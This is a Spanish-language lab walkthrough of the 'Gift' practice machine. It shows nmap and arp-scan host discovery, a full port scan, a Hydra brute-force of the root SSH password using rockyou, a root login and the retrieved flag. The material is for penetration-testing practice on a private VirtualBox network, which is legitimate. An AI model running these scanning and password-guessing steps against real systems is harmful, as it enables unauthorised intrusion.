Parte de [[Maquinas]] y [[Enumeracion de Servicios]]

>1. Barrido de exploracion desde 192.168.56.100 a la 192.168.56.254

``` bash
sudo nmap -sn 192.168.56.100/24
```

Otra opcion:

``` bash
sudo nmap -sn 192.168.56.100-254
```

Salida (de la primera opcion):

``` java
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-14 20:41 CET
Nmap scan report for 192.168.56.1
Host is up (0.00020s latency).
MAC Address: 0A:00:27:00:00:00 (Unknown)
Nmap scan report for 192.168.56.10
Host is up (0.0010s latency).
MAC Address: 08:00:27:02:65:23 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.102
Host is up (0.00077s latency).
MAC Address: 08:00:27:7B:8B:9E (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.103
Host is up (0.00072s latency).
MAC Address: 08:00:27:73:79:CB (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.100
Host is up.
Nmap done: 256 IP addresses (5 hosts up) scanned in 2.11 seconds
```

La IP de la maquina Gift es 192.168.56.103 (ya que 102 es metasploitable)

Otras opciones serian:

``` bash
sudo arp-scan -I eth1 192.168.56.100-192.168.56.254
sudo netdiscover -i eht1 -r 192.168.56.0/24
```

Netdiscover tambien puede trabajar en modo pasivo

> 2. Escaneo de puertos:

``` bash
sudo nmap -n -Pn -sV -O -p- 192.168.56.103 -oN nmap_output.txt
```

Salida:

``` java
Nmap scan report for 192.168.56.103
Host is up (0.0015s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.3 (protocol 2.0)
80/tcp open  http    nginx
MAC Address: 08:00:27:73:79:CB (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 1 hop

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.22 seconds
```

---

## Prueba propia para resolución

Ataque de fuerza bruta a ssh

Comando:

``` bash
hydra -l root -P /usr/share/wordlists/rockyou.txt.gz ssh://192.168.56.103:22
```

Salida:

``` java
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-16 17:48:20
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://192.168.56.103:22/
[22][ssh] host: 192.168.56.103   login: root   password: simple
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 3 final worker threads did not complete until end.
[ERROR] 3 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-01-16 17:48:29
```

La contraseña es "simple" con lo que podemos conectarnos a root por ssh:

``` bash
ssh root@192.168.56.103

The authenticity of host '192.168.56.103 (192.168.56.103)' can't be established.
ED25519 key fingerprint is SHA256:dXsAE5SaInFUaPinoxhcuNloPhb2/x2JhoGVdcF8Y6I.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.56.103' (ED25519) to the list of known hosts.
root@192.168.56.103's password: 

IM AN SSH SERVER

gift:~# ls
root.txt  user.txt

gift:~# cat root.txt
HMVtyr543FG
```

---

